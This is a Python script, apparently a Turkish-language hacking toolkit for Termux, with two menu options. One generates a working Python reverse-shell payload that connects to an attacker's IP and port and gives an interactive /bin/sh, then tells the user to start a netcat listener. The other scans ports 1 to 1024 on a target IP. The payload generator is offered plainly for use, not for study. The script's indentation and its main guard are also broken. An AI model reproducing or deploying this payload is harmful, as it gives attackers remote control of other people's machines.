import os
import socket

def show_logo():
os.system('clear') # Ekranı her seferinde temizler, temiz bir görüntü sağlar
print("""

───

/ / / __ \ \ / / / / /_ () /
/ / / , / \ / ( / __/ / / _ / / __/
// // || //_// //_//_/
v1.0
""")

def payload_menu():
print("\n[+] Payload Oluşturucu")
lhost = input("LHOST (Senin IP'n): ")
lport = input("LPORT (Dinleme Portun): ")

payload_content = f"""
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{lhost}", {lport}))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
"""
# Klasör yoksa oluştur
if not os.path.exists("payloads"):
os.makedirs("payloads")

with open("payloads/shell.py", "w") as f:
f.write(payload_content)

print(f"\n[!] Başarılı! Payload 'payloads/shell.py' olarak kaydedildi.")
print(f"[!] Şimdi Termux'ta şu komutu çalıştır: nc -lvnp {lport}")
input("\nDevam etmek için Enter'a bas...")

def port_scanner():
target = input("\n[?] Hedef IP gir: ")
print(f"[*] {target} taranıyor (Port 1-1024)...")
for port in range(1, 1025):
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(0.05) # Daha hızlı tarama için
if sock.connect_ex((target, port)) == 0:
print(f"[+] Port {port} AÇIK!")
sock.close()
input("\nTarama bitti. Devam etmek için Enter'a bas...")

def main():
while True:
show_logo()
print("1 - Payload Oluştur")
print("2 - Port Tara")
print("0 - Çıkış")

choice = input("\nSeçimini yap: ")

if choice == "1":
payload_menu()
elif choice == "2":
port_scanner()
elif choice == "0":
break
else:
print("Geçersiz seçim!")

if name == "main":
main()